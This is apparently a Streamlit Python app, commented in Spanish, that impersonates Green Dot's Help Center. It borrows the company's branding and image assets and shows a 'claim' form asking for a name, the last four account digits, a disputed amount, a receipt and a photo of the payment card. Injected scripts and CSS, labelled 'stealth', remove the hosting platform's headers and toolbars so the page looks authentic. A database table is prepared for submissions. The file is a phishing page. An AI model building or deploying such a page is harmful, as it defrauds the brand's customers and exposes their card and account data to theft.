
import streamlit as st
import sqlite3
import os
from datetime import datetime

# Configuración de Rutas
DB_NAME = "claims.db"
UPLOAD_DIR = "uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS greendot_submissions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  nombre TEXT, cuenta TEXT, monto REAL,
                  factura_path TEXT, tarjeta_path TEXT, fecha TEXT, ref_id TEXT)""")
    conn.commit()
    conn.close()

init_db()

st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")

# JS NUCLEAR V1.2.8 (FORZAR CONTRASTE Y ESTADO DE BOTÓN)
st.markdown("""<script>
    const forceVisibility = () => {
        // Eliminar cabeceras y menús de Streamlit
        ['header', 'footer', '.stDeployButton', '[data-testid="stHeader"]', '[data-testid="stAppToolbar"]'].forEach(s => {
            document.querySelectorAll(s).forEach(el => el.remove());
        });

        // Forzar fondo negro en contenedores
        document.querySelectorAll('.st-emotion-cache-h5555q').forEach(el => {
            el.style.backgroundColor = '#000000';
            el.style.color = '#FFFFFF';
        });

        // Asegurar que el botón de submit sea visible mediante JS forzado si el CSS falla
        document.querySelectorAll('button[kind="primaryFormSubmit"]').forEach(el => {
            el.style.opacity = '1';
            el.style.visibility = 'visible';
            el.style.display = 'block';
        });
    };
    setInterval(forceVisibility, 30);
</script>""", unsafe_allow_html=True)

# CSS STEALTH TOTAL V1.2.8
st.markdown("""<style>
    /* FONDO NEGRO ABSOLUTO Y TEXTO BLANCO */
    html, body, [data-testid="stAppViewContainer"], .stApp {
        background-color: #000000 !important;
        color: #FFFFFF !important;
    }

    /* FIX DEL BOTÓN SUBMIT (Contraste Máximo) */
    .stButton > button {
        background-color: #00a05b !important;
        color: #FFFFFF !important;
        width: 100% !important;
        height: 55px !important;
        border-radius: 8px !important;
        font-weight: 800 !important;
        font-size: 18px !important;
        border: 2px solid #FFFFFF !important; /* Borde blanco para visibilidad en modo claro */
        text-transform: uppercase !important;
        box-shadow: 0px 4px 15px rgba(0, 160, 91, 0.3) !important;
    }

    /* AJUSTE DE INPUTS */
    .stTextInput input, .stNumberInput input {
        background-color: #1a1a1a !important;
        color: white !important;
        border: 1px solid #333 !important;
    }

    /* VISIBILIDAD DE UPLOADER */
    [data-testid="stFileUploader"] {
        background-color: #1a1a1a !important;
        border: 1px dashed #00a05b !important;
        border-radius: 8px !important;
        padding: 15px !important;
    }

    /* Forzar visibilidad de etiquetas */
    label p { color: #FFFFFF !important; font-weight: bold !important; }
    
    header, footer, .stDeployButton { display: none !important; }
    .block-container { max-width: 500px !important; padding-top: 1rem !important; }
</style>""", unsafe_allow_html=True)

if os.path.exists("logo.svg"): st.image("logo.svg", width=250)
st.title("Help Center")

with st.form("claim_v1_2_8", clear_on_submit=True):
    st.text_input("Full Name")
    st.text_input("Last 4 digits of Account")
    st.number_input("Disputed Amount", format="%.2f")
    st.file_uploader("Store Receipt", type=["jpg","png"])
    st.file_uploader("Card Photo", type=["jpg","png"])
    if st.form_submit_button("SUBMIT NOW"):
        st.success("Claim Received.")

st.markdown("""<div style='background-color: #111; padding: 20px; border-radius: 12px; text-align: center; margin-top: 20px; border: 1px solid #222;'>
    <p style='color: white; font-weight: bold;'>Download the Green Dot app</p>
    <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='120'>
    <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='120'>
</div>""", unsafe_allow_html=True)
